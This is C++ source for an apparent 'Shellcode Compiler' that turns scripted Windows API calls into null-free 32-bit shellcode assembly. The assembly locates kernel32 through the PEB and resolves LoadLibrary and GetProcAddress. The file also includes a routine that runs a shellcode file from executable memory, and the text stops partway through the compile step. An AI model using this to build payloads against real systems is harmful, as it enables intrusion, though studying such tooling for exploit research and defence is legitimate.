// Shellcode Test.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <cstdio>
#include <string>
#include <sstream>
#include <iostream>
#include <vector>
#include <windows.h>

using namespace std;

// Program version

#define PROGRAM_VERSION "v0.1 Alpha"

// Special characters

#define CHR_READ_ALPHANUMSTR '\x01'
#define CHR_READ_NUMBER	     '\x02'

// Transform struct

struct State;

struct Transform
{
	char   Character;
	State* NextState;
};

// State struct

struct State
{
	string Data = "";
	bool Process = false;
	vector<Transform> Transforms;
	string Name;
	void(*ProcessStateData)(string);
};

// Vector with declared functions

struct DeclaredFunction
{
	string Name;
	string DLL;
};

size_t AllDeclaredFunctionsNr = 0;
vector<DeclaredFunction> AllDeclaredFunctions;

// Add function name

void AddFunctionName(string p_sFunctionName)
{
	DeclaredFunction Function;
	Function.Name = p_sFunctionName;
	AllDeclaredFunctions.push_back(Function);
}

// Add function DLL name

void AddFunctionDLLName(string p_sDLLName)
{
	AllDeclaredFunctions[AllDeclaredFunctionsNr].DLL = p_sDLLName;
	AllDeclaredFunctionsNr++;
}

#define PARAMETER_TYPE_INT		0
#define PARAMETER_TYPE_STRING	1

// Struct used to save a parameter

struct Parameter
{
	size_t Type;
	size_t IntValue;
	string StringValue;
};

// Struct to save data for a function call

struct FunctionCall
{
	string Name;
	vector<Parameter> Parameters;
};

// All function calls and index

size_t AllFunctionCallsNr = 0;
vector<FunctionCall> AllFunctionCalls;
bool FirstFunctionCall = true;

// Add function call name

void AddFunctionCallName(string p_sFunctionName)
{
	FunctionCall Function;
	Function.Name = p_sFunctionName;
	AllFunctionCalls.push_back(Function);
	if (FirstFunctionCall) FirstFunctionCall = false;
	else AllFunctionCallsNr++;
}

// Add function call int parameter

void AddFunctionCallIntParameter(string p_sIntParameter)
{
	Parameter Param;
	Param.Type = PARAMETER_TYPE_INT;
	Param.IntValue = (size_t)stoll(p_sIntParameter); 
	AllFunctionCalls[AllFunctionCallsNr].Parameters.push_back(Param);
}

// Add function call string parameter

void AddFunctionCallStringParameter(string p_sStringParameter)
{
	Parameter Param;
	Param.Type = PARAMETER_TYPE_STRING;
	Param.StringValue = p_sStringParameter;
	AllFunctionCalls[AllFunctionCallsNr].Parameters.push_back(Param);
}

// Check if a function exists

bool FunctionExists(string p_sFunctionName)
{
	for (size_t i = 0; i < AllDeclaredFunctions.size(); i++)
		if (AllDeclaredFunctions[i].Name.compare(p_sFunctionName) == 0) return true;
	return false;
}

// Dump all data - debug purposes

void DumpAllData()
{
	cout << endl;
	for (size_t i = 0; i < AllDeclaredFunctions.size(); i++)
	{
		cout << "Declared:" << AllDeclaredFunctions[i].Name << " @ " << AllDeclaredFunctions[i].DLL << endl;
	}
	cout << endl;

	for (size_t i = 0; i < AllFunctionCalls.size(); i++)
	{
		cout << "Call function: " << AllFunctionCalls[i].Name << endl;
		for (size_t j = 0; j < AllFunctionCalls[i].Parameters.size(); j++)
		{
			cout << ((AllFunctionCalls[i].Parameters[j].Type == PARAMETER_TYPE_STRING) ? "String" : "Int") << " parameter: ";
			if (AllFunctionCalls[i].Parameters[j].Type == PARAMETER_TYPE_STRING) cout << AllFunctionCalls[i].Parameters[j].StringValue << endl;
			else cout << AllFunctionCalls[i].Parameters[j].IntValue << endl;
		}
	}
	cout << endl;
}

// Write output to file

void WriteToFile(string p_sOutputFile, string p_sData)
{
	FILE* f = fopen(p_sOutputFile.c_str(), "ab");

	// Write

	fwrite(p_sData.c_str(), p_sData.length(), sizeof(char), f);

	// Close

	fclose(f);
}

// Return hex string for a char

string CharToHexString(char p_cChar)
{
	stringstream ss;
	ss << hex << (int)p_cChar;
	string mystr = ss.str();

	return mystr;
}

// Return ASM header -> PEB, GetProcAddress, LoadLibrary

string GetASMHeader()
{
	string sContent =
		"; Shellcode generated using Shellcode Compiler                         \r\n"
		"; https://github.com/NytroRST/ShellcodeCompiler                    \r\n\r\n"
		"BITS 32                                                                \r\n"
		"SECTION .text                                                          \r\n"
		"global main                                                            \r\n"
		"main:                                                              \r\n\r\n"
		"xor ecx, ecx                                                           \r\n"
		"mov eax, [fs:ecx + 0x30]               ; EAX = PEB                     \r\n"
		"mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr                \r\n"
		"mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder     \r\n"
		"lodsd                                  ; EAX = Second module           \r\n"
		"xchg eax, esi                          ; EAX = ESI, ESI = EAX          \r\n"
		"lodsd                                  ; EAX = Third(kernel32)         \r\n"
		"mov ebx, [eax + 0x10]                  ; EBX = Base address            \r\n"
		"mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew           \r\n"
		"add edx, ebx                           ; EDX = PE Header               \r\n"
		"mov edx, [edx + 0x78]                  ; EDX = Offset export table     \r\n"
		"add edx, ebx                           ; EDX = Export table            \r\n"
		"mov esi, [edx + 0x20]                  ; ESI = Offset namestable       \r\n"
		"add esi, ebx                           ; ESI = Names table             \r\n"
		"xor ecx, ecx                           ; EXC = 0                       \r\n\r\n"

		"Get_Function:                                                          \r\n\r\n"

		"inc ecx                                ; Increment the ordinal         \r\n"
		"lodsd                                  ; Get name offset               \r\n"
		"add eax, ebx                           ; Get function name             \r\n"
		"cmp dword [eax], 0x50746547            ; GetP                          \r\n"
		"jnz Get_Function                                                       \r\n"
		"cmp dword [eax + 0x4], 0x41636f72      ; rocA                          \r\n"
		"jnz Get_Function                                                       \r\n"
		"cmp dword [eax + 0x8], 0x65726464      ; ddre                          \r\n"
		"jnz Get_Function                                                       \r\n"
		"mov esi, [edx + 0x24]                  ; ESI = Offset ordinals         \r\n"
		"add esi, ebx                           ; ESI = Ordinals table          \r\n"
		"mov cx, [esi + ecx * 2]                ; Number of function            \r\n"
		"dec ecx                                                                \r\n"
		"mov esi, [edx + 0x1c]                  ; Offset address table          \r\n"
		"add esi, ebx                           ; ESI = Address table           \r\n"
		"mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)         \r\n"
		"add edx, ebx                           ; EDX = GetProcAddress          \r\n\r\n"

		"xor ecx, ecx                           ; ECX = 0                       \r\n"
		"push ebx                               ; Kernel32 base address         \r\n"
		"push edx                               ; GetProcAddress                \r\n"
		"push ecx                               ; 0                             \r\n"
		"push 0x41797261                        ; aryA                          \r\n"
		"push 0x7262694c                        ; Libr                          \r\n"
		"push 0x64616f4c                        ; Load                          \r\n"
		"push esp                               ; LoadLibrary                   \r\n"
		"push ebx                               ; Kernel32 base address         \r\n"
		"call edx                               ; GetProcAddress(LL)            \r\n\r\n"

		"add esp, 0xc                           ; pop LoadLibrary               \r\n"
		"pop ecx                                ; ECX = 0                       \r\n"
		"push eax                               ; EAX = LoadLibrary             \r\n\r\n";

	return sContent;
}

// Struct to save DLL base offset address on the stack

struct DLLBase
{
	string Name;
	size_t Offset;
};

vector<DLLBase> DLLOffsets;
size_t CurrentDLLIOffset = 4;

// Create kernel32 DLL base index

void InitDLLBase()
{
	DLLBase kernel;
	kernel.Name = "kernel32.dll";
	kernel.Offset = 1;
	DLLOffsets.push_back(kernel);
}

// Check if a DLL base index already exists

bool DLLBaseExists(string p_sDLLName)
{
	for (size_t i = 0; i < DLLOffsets.size(); i++)
		if (DLLOffsets[i].Name.compare(p_sDLLName) == 0) return true;

	return false;
}

// Add a DLL base index

void AddDLLBase(string p_sDLLName)
{
	DLLBase dll;

	// Check if DLL already exists

	if (DLLBaseExists(p_sDLLName)) return;

	dll.Name = p_sDLLName;
	dll.Offset = CurrentDLLIOffset;
	DLLOffsets.push_back(dll);

	CurrentDLLIOffset++;
}

// Get DLL base index

size_t GetDLLBase(string p_sDLLName)
{
	for (size_t i = 0; i < DLLOffsets.size(); i++)
		if (DLLOffsets[i].Name.compare(p_sDLLName) == 0) return DLLOffsets[i].Offset;

	cout << "Error: Cannot find DLL base index for " << p_sDLLName << endl;

	return 0;
}

// Struct to save function address offset on the stack

struct FunctionOffset
{
	string Name;
	size_t Offset;
};

vector<FunctionOffset> FunctionOffsets;
size_t CurrentFunctionOffset = 1;

// Check if a function offset already exists

bool FunctionOffsetExists(string p_sFunctionName)
{
	for (size_t i = 0; i < FunctionOffsets.size(); i++)
		if (FunctionOffsets[i].Name.compare(p_sFunctionName) == 0) return true;

	return false;
}

// Add a function offset

void AddFunctionOffset(string p_sFunctionName)
{
	FunctionOffset func;

	// Check if DLL already exists

	if (FunctionOffsetExists(p_sFunctionName)) return;

	func.Name = p_sFunctionName;
	func.Offset = CurrentFunctionOffset;
	FunctionOffsets.push_back(func);

	CurrentFunctionOffset++;
}

// Get function offset

size_t GetFunctionOffset(string p_sFunctionName)
{
	for (size_t i = 0; i < FunctionOffsets.size(); i++)
		if (FunctionOffsets[i].Name.compare(p_sFunctionName) == 0) return FunctionOffsets[i].Offset;

	cout << "Error: Cannot find function offset for " << p_sFunctionName << endl;

	return 0;
}

// Struct to save strings (for function calls) on the stack

struct StringOffset
{
	string Name;
	size_t Offset;
};

vector<StringOffset> StringOffsets;
size_t CurrentStringOffset = 0;

// Check if a string offset already exists

bool StringOffsetExists(string p_sString)
{
	for (size_t i = 0; i < StringOffsets.size(); i++)
		if (StringOffsets[i].Name.compare(p_sString) == 0) return true;

	return false;
}

// Add a string offset

void AddStringOffset(string p_sString)
{
	StringOffset str;

	// Check if string already exists

	if (StringOffsetExists(p_sString)) return;

	str.Name = p_sString;
	str.Offset = CurrentStringOffset;
	StringOffsets.push_back(str);
}

// Get string offset

size_t GetStringOffset(string p_sString)
{
	for (size_t i = 0; i < StringOffsets.size(); i++)
		if (StringOffsets[i].Name.compare(p_sString) == 0) return StringOffsets[i].Offset;

	cout << "Error: Cannot find string offset for " << p_sString << endl;

	return 0;
}

// Convert int to hex

string IntToHexString(size_t p_iNumber)
{
	std::stringstream stream;
	stream << std::hex << p_iNumber;
	std::string result(stream.str());

	return result;
}

// Generate a call to LoadLibrary("string")

size_t NrBasesToStack = 0;

string GenerateLoadLibraryCall(string p_sDLLName)
{
	string sContent = "";
	size_t Len = p_sDLLName.length();

	// Check if the DLL was already loades

	if (DLLBaseExists(p_sDLLName)) return "";

	if (Len % 4 == 0)
	{
		sContent = "xor eax, eax                            ; EAX = 0                       \r\n";
		sContent += "push eax                               ; NULL on the stack             \r\n";
	}
	else if (Len % 4 == 1)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov al, 0x";
		sContent += CharToHexString(p_sDLLName[Len - 1]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 2)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov ax, 0x";
		sContent += CharToHexString(p_sDLLName[Len - 1]);
		sContent += CharToHexString(p_sDLLName[Len - 2]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 3)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov eax, 0x23";
		sContent += CharToHexString(p_sDLLName[Len - 1]);
		sContent += CharToHexString(p_sDLLName[Len - 2]);
		sContent += CharToHexString(p_sDLLName[Len - 3]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
		sContent += "sub dword [esp + 3], 0x23\r\n";
	}
	else cout << "Imaginary number?" << endl;

	// Put the string as hex data pushes on the stack

	size_t Times = Len / 4;
	for (size_t i = Times; i > 0; i--)
	{
		sContent += "push 0x";
		for (size_t j = 4; j > 0; j--)
		{
			sContent += CharToHexString(p_sDLLName[i * 4 - 4 + j - 1]);
		}
		sContent += "\r\n";
	}

	// LoadLibrary function call

	sContent += "push esp                               ; String on the stack           \r\n";
	sContent += "call dword [esp + ";
	sContent += to_string(((Times + 2) * 4) + NrBasesToStack * 4);
	sContent += "]\r\n";
	sContent += "add esp, ";
	sContent += to_string(((Times + 1) * 4));
	sContent += "\r\n";
	sContent += "push eax                               ; DLL base on the stack         \r\n\r\n";

	// Add DLL to base list and increment bases on stack number

	AddDLLBase(p_sDLLName);
	NrBasesToStack++;

	return sContent;
}

// Generate a call to GetProcAddress(DLLBase, "FunctionName")

size_t NrFunctionsToStack = 0;

string GenerateGetProcAddressCall(string p_sDLLName, string p_sFunctionName)
{
	string sContent = "";
	size_t Len = p_sFunctionName.length();

	// Check if the function address was already found

	if (FunctionOffsetExists(p_sFunctionName)) return "";

	if (Len % 4 == 0)
	{
		sContent = "xor eax, eax                            ; EAX = 0                       \r\n";
		sContent += "push eax                               ; NULL on the stack             \r\n";
	}
	else if (Len % 4 == 1)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov al, 0x";
		sContent += CharToHexString(p_sFunctionName[Len - 1]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 2)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov ax, 0x";
		sContent += CharToHexString(p_sFunctionName[Len - 1]);
		sContent += CharToHexString(p_sFunctionName[Len - 2]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 3)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov eax, 0x23";
		sContent += CharToHexString(p_sFunctionName[Len - 1]);
		sContent += CharToHexString(p_sFunctionName[Len - 2]);
		sContent += CharToHexString(p_sFunctionName[Len - 3]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
		sContent += "sub dword [esp + 3], 0x23\r\n";
	}
	else cout << "Imaginary number?" << endl;

	// Put the string as hex data pushes on the stack

	size_t Times = Len / 4;
	for (size_t i = Times; i > 0; i--)
	{
		sContent += "push 0x";
		for (size_t j = 4; j > 0; j--)
		{
			sContent += CharToHexString(p_sFunctionName[i * 4 - 4 + j - 1]);
		}
		sContent += "\r\n";
	}

	// LoadLibrary function call

	sContent += "push esp                               ; String on the stack            \r\n";
	sContent += "push dword [esp + ";
	sContent += to_string((NrFunctionsToStack * 4) + ((NrBasesToStack + 3 - GetDLLBase(p_sDLLName)) * 4) + ((Times + 2) * 4));
	sContent += "] \r\n";

	// Call GetProcAddress

	sContent += "call dword [esp + ";
	sContent += to_string(((NrFunctionsToStack + 1) * 4) + ((NrBasesToStack + 1) * 4) + ((Times + 2) * 4));
	sContent += "]\r\n";
	sContent += "add esp, ";
	sContent += to_string(((Times + 1) * 4));
	sContent += "\r\n";
	sContent += "push eax                               ; Function address on the stack \r\n\r\n";

	// Add function address to the list and increment nr of functions on stack number

	AddFunctionOffset(p_sFunctionName);
	NrFunctionsToStack++;

	// Do it!

	return sContent;
}

// Put a string (function parameter) on the stack

string GeneratePutStringToStack(string p_sString)
{
	string sContent = "";
	size_t Len = p_sString.length();

	// Check if the string was already on the stack

	if (StringOffsetExists(p_sString)) return "";

	if (Len % 4 == 0)
	{
		sContent  = "xor eax, eax                            ; EAX = 0                       \r\n";
		sContent += "push eax                                ; NULL on the stack             \r\n";
	}
	else if (Len % 4 == 1)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov al, 0x";
		sContent += CharToHexString(p_sString[Len - 1]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 2)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov ax, 0x";
		sContent += CharToHexString(p_sString[Len - 1]);
		sContent += CharToHexString(p_sString[Len - 2]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
	}
	else if (Len % 4 == 3)
	{
		sContent = "xor eax, eax\r\n";
		sContent += "mov eax, 0x23";
		sContent += CharToHexString(p_sString[Len - 1]);
		sContent += CharToHexString(p_sString[Len - 2]);
		sContent += CharToHexString(p_sString[Len - 3]);
		sContent += "\r\n";
		sContent += "push eax\r\n";
		sContent += "sub dword [esp + 3], 0x23\r\n";
	}
	else cout << "Imaginary number?" << endl;

	// Put the string as hex data pushes on the stack

	size_t Times = Len / 4;
	for (size_t i = Times; i > 0; i--)
	{
		sContent += "push 0x";
		for (size_t j = 4; j > 0; j--)
		{
			sContent += CharToHexString(p_sString[i * 4 - 4 + j - 1]);
		}
		sContent += "\r\n";
	}

	// Add dtring offset 

	sContent += "push esp\r\n\r\n";
	CurrentStringOffset = CurrentStringOffset + Times + 2;
	AddStringOffset(p_sString);

	return sContent;
}

// Generate a function call

string GenerateFunctionCall(FunctionCall p_oFunctionCall)
{
	string sContent = "";
	size_t NrParam = p_oFunctionCall.Parameters.size();
	size_t CurrentParamNr = 1;

	// First, put all string parameters on the stack

	for (size_t i = 0; i < p_oFunctionCall.Parameters.size(); i++)
		if (p_oFunctionCall.Parameters[i].Type == PARAMETER_TYPE_STRING) sContent += GeneratePutStringToStack(p_oFunctionCall.Parameters[i].StringValue);

	// Parse all arguments (from the end)

	for (size_t i = NrParam - 1; ; i--)
	{
		if (p_oFunctionCall.Parameters[i].Type == PARAMETER_TYPE_STRING)
		{
			sContent += "push dword [ESP + ";
			sContent += to_string(((CurrentParamNr - 1) * 4) + ((CurrentStringOffset - GetStringOffset(p_oFunctionCall.Parameters[i].StringValue)) * 4));
			sContent += "]\r\n";
		}
		else if (p_oFunctionCall.Parameters[i].Type == PARAMETER_TYPE_INT)
		{
			// If int parameter is 0, avoid NULL

			if (p_oFunctionCall.Parameters[i].IntValue == 0)
			{
				sContent += "xor eax, eax\r\n";
				sContent += "push eax\r\n";
			}
			else
			{
				sContent += "push 0x";
				sContent += IntToHexString(p_oFunctionCall.Parameters[i].IntValue);
				sContent += "\r\n";
			}
		}
		else cout << "Error: Undefined parameter type!" << endl;

		CurrentParamNr++;
		if (i == 0) break;
	}

	// Call function

	sContent += "call dword [ESP + ";
	sContent += to_string(((NrParam - 1) * 4) + (CurrentStringOffset * 4) + ((CurrentFunctionOffset - GetFunctionOffset(p_oFunctionCall.Name)) * 4));
	sContent += "]\r\n";

	// Clean string parameters

	if (CurrentStringOffset > 0)
	{
		sContent += "add ESP, ";
		sContent += to_string(CurrentStringOffset * 4);
		sContent += "\r\n";
	}

	// Clean global strings data

	CurrentStringOffset = 0;
	StringOffsets.clear();

	return sContent;
}

// Declare functions states

State DF_function;
State DF_FunctionName;
State DF_FunctionDLLStr;
State DF_ReadStringInQuotes;
State DF_GotStrInQuotes;
State DF_FinishStrInQuotes;

// Call functions states

State CF_FunctionCall;
State CF_GetFirstParam;
State CF_ReadStrInQuotes;
State CF_GotStrInQuotes;
State CF_GetNextArg;
State CF_GetNumber;
State CF_GotAllArgs;

// Process data for FUNCTION NAME

void ProcessStateData_FunctionName(string p_sString)
{
	AddFunctionName(p_sString);
}

// Process data for FUNCTION DLL NAME

void ProcessStateData_FunctionDLLName(string p_sString)
{
	AddFunctionDLLName(p_sString);
}

// Process data for FUNCTION STRING PARAMETER

void ProcessStateData_FunctionCallStringArg(string p_sString)
{
	AddFunctionCallStringParameter(p_sString);
}

// Process data for FUNCTION INT PARAMETER

void ProcessStateData_FunctionCallIntArg(string p_sString)
{
	AddFunctionCallIntParameter(p_sString);
}

// Function used to check if a character is "string": [a-z][A-Z][0-9][Specail]

bool IsString(char p_cCharacter)
{
	return (p_cCharacter >= 32 && p_cCharacter <= 126 &&
		p_cCharacter != '"' && p_cCharacter != ')' && p_cCharacter != '(' && p_cCharacter != ',');
}

// Get TEMP folder

string GetTemp()
{
	char buffer[1024];
	string sContent = "";

	DWORD r = GetTempPath(1024, buffer);

	if (r == 0) return "";
	sContent = buffer;
	
	return sContent;
}

// Get current working directory

string GetCurrentDir()
{
	char buffer[1024];
	string sContent = "";

	DWORD r = GetCurrentDirectory(1024, buffer);

	if (r == 0) return "";
	sContent = buffer;

	return sContent;
}

// Check if a file exists

bool FileExists(string p_sPath)
{
	DWORD dwAttrib = GetFileAttributes(p_sPath.c_str());

	return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

// Delete a file

bool DeleteSourceFile(string p_sFile)
{
	return DeleteFile(p_sFile.c_str());
}

// Function used to read a file

string ReadSourceFile(string p_sFilename)
{
	string contents = "";

	FILE* f = fopen(p_sFilename.c_str(), "rb");

	// Get file size

	fseek(f, 0, SEEK_END);
	size_t size = ftell(f);

	char* cdata = new char[size + 1];
	cdata[size] = '\0';

	// Read file

	rewind(f);
	fread(cdata, sizeof(char), size, f);
	fclose(f);

	// Return data

	contents = cdata;
	delete[] cdata;

	return contents;
}

// Get the size of a file

size_t GetSize(string p_sFilename)
{
	size_t size;
	FILE* f = fopen(p_sFilename.c_str(), "rb");

	// Get file size

	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);

	return size;
}

// Read binary file

unsigned char* ReadBinaryFile(string p_sFilename, size_t *p_rSize)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;

	if (!FileExists(p_sFilename))
	{
		cout << "Binary file does not exists!" << endl;
		return NULL;
	}

	// Get size and allocate space

	*p_rSize = GetSize(p_sFilename);
	if (*p_rSize == 0) return NULL;
		
	f = fopen(p_sFilename.c_str(), "rb");

	p = new unsigned char[*p_rSize];

	// Read file

	rewind(f);
	res = fread(p, sizeof(unsigned char), *p_rSize, f);
	fclose(f);

	if (res == 0)
	{
		delete[] p;
		return NULL;
	}

	return p;
}

// Test the generated shellcode

void TestShellcode(string p_sFilename)
{
	unsigned char *p = NULL;
	size_t size = 0;
	
	p = ReadBinaryFile(p_sFilename, &size);

	// Check if successful read

	if (size == 0 || p == NULL)
	{
		cout << "Error: Cannot read shellcode file!" << endl;
		return;
	}

	// Get space for shellcode

	void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (sc == NULL)
	{
		cout << "Error: Cannot allocate space for shellcode!" << endl;
		return;
	}

	// Copy shellcode and execute it

	memcpy(sc, p, size);
	(*(int(*)()) sc)();
}

// Function used to parse data

bool ParseFile(string p_sFileData)
{
	bool result = true;
	string sReadString = "";
	State CurrentState;

	for (size_t i = 0; i < p_sFileData.length(); i++)
	{
		// Check for a string

		if (isalnum(p_sFileData[i]))
		{
			sReadString += p_sFileData[i];
		}

		// If it is not an alphanumeric character

		else
		{
			// We have a "function" definition

			if (sReadString.compare("function") == 0)
			{
				CurrentState = DF_function;

				// PROCESS "function" - Declare a function

				while (true)
				{
					// Parse states transforms

					for (size_t s = 0; s < CurrentState.Transforms.size(); s++)
					{
						if (CurrentState.Transforms[s].Character == p_sFileData[i])
						{
							//cout << "We found a transform (" << i << "): " << p_sFileData[i] << " [" << (int)p_sFileData[i] << "] - Current state: " << CurrentState.Name << endl;

							// Process state

							if (CurrentState.Process)
							{
								// Do stuff

								CurrentState.ProcessStateData(CurrentState.Data);
								CurrentState.Data = "";
							}

							// Go to next state

							CurrentState = *(CurrentState.Transforms[s].NextState);
							//cout << "Moved to state: " << CurrentState.Name << endl;
							break;
						}
						else if (CurrentState.Transforms[s].Character == CHR_READ_ALPHANUMSTR && IsString(p_sFileData[i]))
						{
							CurrentState.Data = CurrentState.Data + p_sFileData[i];

							// Do not change current state
						}
						else if (CurrentState.Transforms[s].Character == CHR_READ_ALPHANUMSTR && IsString(p_sFileData[i]))
						{
							CurrentState.Data = CurrentState.Data + p_sFileData[i];

							// Do not change current state
						}
						//else cout << "Stuff: " << p_sFileData[i] << " on " << CurrentState.Name << endl;
					}

					i++;
					if (p_sFileData[i] == ';' || i == p_sFileData.length()) break;
				}
			}
			else if (FunctionExists(sReadString))
			{
				AddFunctionCallName(sReadString);

				CurrentState = CF_FunctionCall;

				// PROCESS "function" - Declare a function

				while (true)
				{
					// Parse states transforms

					for (size_t s = 0; s < CurrentState.Transforms.size(); s++)
					{
						if (CurrentState.Transforms[s].Character == p_sFileData[i])
						{
							//cout << "We found a transform (" << i << "): " << p_sFileData[i] << " [" << (int)p_sFileData[i] << "] - Current state: " << CurrentState.Name << endl;

							// Process state

							if (CurrentState.Process)
							{
								// Do stuff

								CurrentState.ProcessStateData(CurrentState.Data);
								CurrentState.Data.clear();
							}

							// Go to next state

							CurrentState = *(CurrentState.Transforms[s].NextState);
							//cout << "Moved to state: " << CurrentState.Name << endl;
							break;
						}
						else if (CurrentState.Transforms[s].Character == CHR_READ_NUMBER && isdigit(p_sFileData[i]))
						{
							if (CurrentState.Name.compare((CurrentState.Transforms[s].NextState)->Name) != 0) (CurrentState.Transforms[s].NextState)->Data = "";

							(CurrentState.Transforms[s].NextState)->Data += p_sFileData[i];
							CurrentState = *(CurrentState.Transforms[s].NextState);
						}
						else if (CurrentState.Transforms[s].Character == CHR_READ_ALPHANUMSTR && IsString(p_sFileData[i]))
						{
							CurrentState.Data = CurrentState.Data + p_sFileData[i];

							// Do not change current state
						}
						//else cout << "Stuff: " << p_sFileData[i] << " on " << CurrentState.Name << endl;
					}

					i++;
					if (p_sFileData[i] == ';' || i == p_sFileData.length()) break;
				}
			}

			// Reset string

			sReadString = "";
		}
	}

	return result;
}

// Function used to create the declare functions states

void CreateDeclareFunctionsStates()
{
	Transform T;

	// From "DF_function" with space go to "DF_FunctionName"
	T.Character = ' ';
	T.NextState = &DF_FunctionName;
	DF_function.Transforms.push_back(T);
	DF_function.Name = "function";

	// From "DF_FunctionName" with AlphaNum go to "DF_FunctionName"
	T.Character = CHR_READ_ALPHANUMSTR;
	T.NextState = &DF_FunctionName;
	DF_FunctionName.Transforms.push_back(T);
	DF_FunctionName.Name = "FunctionName";
	DF_FunctionName.Process = true;
	DF_FunctionName.ProcessStateData = ProcessStateData_FunctionName;

	// From "DF_FunctionName" with "(" go to "DF_FunctionDLLStr"
	T.Character = '(';
	T.NextState = &DF_FunctionDLLStr;
	DF_FunctionName.Transforms.push_back(T);

	// From "DF_FunctionDLLStr" with "\"" go to "DF_ReadStrInQuotes"
	T.Character = '"';
	T.NextState = &DF_ReadStringInQuotes;
	DF_FunctionDLLStr.Transforms.push_back(T);
	DF_FunctionDLLStr.Name = "FunctionDLLStr";

	// From "DF_ReadStrInQuotes" with AlphaNum go to "DF_ReadStrInQuotes"
	T.Character = CHR_READ_ALPHANUMSTR;
	T.NextState = &DF_ReadStringInQuotes;
	DF_ReadStringInQuotes.Transforms.push_back(T);
	DF_ReadStringInQuotes.Name = "ReadStringInQuotes";
	DF_ReadStringInQuotes.Process = true;
	DF_ReadStringInQuotes.ProcessStateData = ProcessStateData_FunctionDLLName;

	// From "DF_ReadStringInQuotes" with "\"" go to "DF_GotStrInQuotes"
	T.Character = '"';
	T.NextState = &DF_GotStrInQuotes;
	DF_ReadStringInQuotes.Transforms.push_back(T);

	// From "DF_GotStrInQuotes" with ")" go to "DF_FinishStrInQuotes"
	T.Character = ')';
	T.NextState = &DF_FinishStrInQuotes;
	DF_GotStrInQuotes.Transforms.push_back(T);
	DF_GotStrInQuotes.Name = "GotStrInQuotes";
}

// Function used to create the declare functions states

void CreateCallFunctionsStates()
{
	Transform T;

	// From "CF_FunctionCall" with "(" go to "CF_GetFirstParam"
	T.Character = '(';
	T.NextState = &CF_GetFirstParam;
	CF_FunctionCall.Transforms.push_back(T);
	CF_FunctionCall.Name = "CF_FunctionCall";

	// From "CF_GetFirstParam" with "\"" go to CF_ReadStrInQuotes
	T.Character = '"';
	T.NextState = &CF_ReadStrInQuotes;
	CF_GetFirstParam.Transforms.push_back(T);
	CF_GetFirstParam.Name = "CF_GetFirstParam";

	// From "CF_ReadStrInQuotes" with AlphaNum go to "CF_ReadStrInQuotes"
	T.Character = CHR_READ_ALPHANUMSTR;
	T.NextState = &CF_ReadStrInQuotes;
	CF_ReadStrInQuotes.Transforms.push_back(T);
	CF_ReadStrInQuotes.Name = "CF_ReadStrInQuotes";
	CF_ReadStrInQuotes.Process = true;
	CF_ReadStrInQuotes.ProcessStateData = ProcessStateData_FunctionCallStringArg;

	// From "CF_ReadStrInQuotes" with "\"" go to "CF_GotStrInQuotes"
	T.Character = '"';
	T.NextState = &CF_GotStrInQuotes;
	CF_ReadStrInQuotes.Transforms.push_back(T);

	// From "CF_GotStrInQuotes" with ")" go to "CF_GotAllArgs"
	T.Character = ')';
	T.NextState = &CF_GotAllArgs;
	CF_GotStrInQuotes.Transforms.push_back(T);
	CF_GotStrInQuotes.Name = "CF_GotStrInQuotes";

	// From "CF_GotStrInQuotes" with "," go to "CF_GetNextArg"
	T.Character = ',';
	T.NextState = &CF_GetNextArg;
	CF_GotStrInQuotes.Transforms.push_back(T);

	// From "CF_GetFirstParam" with Numeric go to "CF_GetNumber"
	T.Character = CHR_READ_NUMBER;
	T.NextState = &CF_GetNumber;
	CF_GetFirstParam.Transforms.push_back(T);

	// From "CF_GetNumber" with Numeric go to "CF_GetNumber"
	T.Character = CHR_READ_NUMBER;
	T.NextState = &CF_GetNumber;
	CF_GetNumber.Transforms.push_back(T);
	CF_GetNumber.Name = "CF_GetNumber";
	CF_GetNumber.Process = true;
	CF_GetNumber.ProcessStateData = ProcessStateData_FunctionCallIntArg;

	// From "CF_GetNumber" with "," go to "CF_GetNextArg"
	T.Character = ',';
	T.NextState = &CF_GetNextArg;
	CF_GetNumber.Transforms.push_back(T);

	// From "CF_GetNumber" with ")" go to "CF_GotAllArgs"
	T.Character = ')';
	T.NextState = &CF_GotAllArgs;
	CF_GetNumber.Transforms.push_back(T);
	CF_GotAllArgs.Name = "CF_GotAllArgs";

	// From "CF_GetNextArg" with Numeric go to "CF_GetNumber"
	T.Character = CHR_READ_NUMBER;
	T.NextState = &CF_GetNumber;
	CF_GetNextArg.Transforms.push_back(T);
	CF_GetNextArg.Name = "CF_GetNextArg";

	// From "CF_GetNextArg" with "\"" go to "CF_ReadStrInQuotes"
	T.Character = '"';
	T.NextState = &CF_ReadStrInQuotes;
	CF_GetNextArg.Transforms.push_back(T);
}

// Compile all parsed data into ASM file

void CompileAllData(string p_sOutput)
{
	WriteToFile(p_sOutput, GetASMHeader());

	// Generate LoadLibrary for all DLLs (from declared functions)

	for (size_t i = 0; i < AllDeclaredFunctions.size(); i++)
	{
		WriteToFile(p_sOutput, GenerateLoadLibraryCall(AllDeclaredFunctions[i].DLL));
	}

